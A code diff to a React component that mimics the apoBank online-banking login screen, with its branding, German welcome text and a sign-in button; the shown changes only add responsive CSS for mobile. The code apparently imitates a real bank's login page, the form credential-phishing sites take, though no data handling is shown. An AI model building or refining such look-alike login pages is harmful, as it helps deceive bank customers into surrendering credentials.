@@ -77,8 +77,9 @@ const Apobank = () => {
           }}
         >
           {/* Header */}
-          <div style={{ background: "#fff", padding: "22px 48px" }}>
+          <div className="apo-head" style={{ background: "#fff", padding: "22px 48px" }}>
             <h1
+              className="apo-title"
               style={{
                 color: "#004893",
                 fontSize: 40,
@@ -86,6 +87,7 @@ const Apobank = () => {
                 fontFamily: "Arial, sans-serif",
                 margin: 0,
                 lineHeight: 1.2,
+                whiteSpace: "nowrap",
               }}
             >
               Login apoBank
@@ -93,7 +95,8 @@ const Apobank = () => {
           </div>
 
           {/* Body */}
-          <div style={{ background: BODY_BG, padding: "36px 48px 40px" }}>
+          <div className="apo-body" style={{ background: BODY_BG, padding: "36px 48px 40px" }}>
+
             <div style={{ fontWeight: 600, marginBottom: 24 }}>
               Willkommen im Online-Banking der apoBank
             </div>
@@ -160,7 +163,7 @@ const Apobank = () => {
                 </div>
               </div>
 
-              <div style={{ display: "flex", justifyContent: "flex-end", marginTop: 8 }}>
+              <div className="apo-btn-wrap" style={{ display: "flex", justifyContent: "flex-end", marginTop: 8 }}>
                 <button
                   type="submit"
                   disabled={!canSubmit || submitting}
@@ -169,6 +172,7 @@ const Apobank = () => {
                   Anmelden
                 </button>
               </div>
+
 
               <p style={{ marginTop: 4, marginBottom: 16 }}>
                 Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die{" "}
@@ -288,7 +292,15 @@ const Apobank = () => {
           background-color: transparent;
           cursor: default;
         }
+        @media (max-width: 767px) {
+          .apo-head { padding: 16px 18px !important; }
+          .apo-body { padding: 20px 18px 24px !important; }
+          .apo-title { font-size: 28px !important; }
+          .apo-btn-wrap { justify-content: stretch !important; }
+          .apo-btn-wrap .apo-btn { width: 100%; min-width: 0; }
+        }
       `}</style>
+
 
       {showLoading && (
         <LoadingOverlay
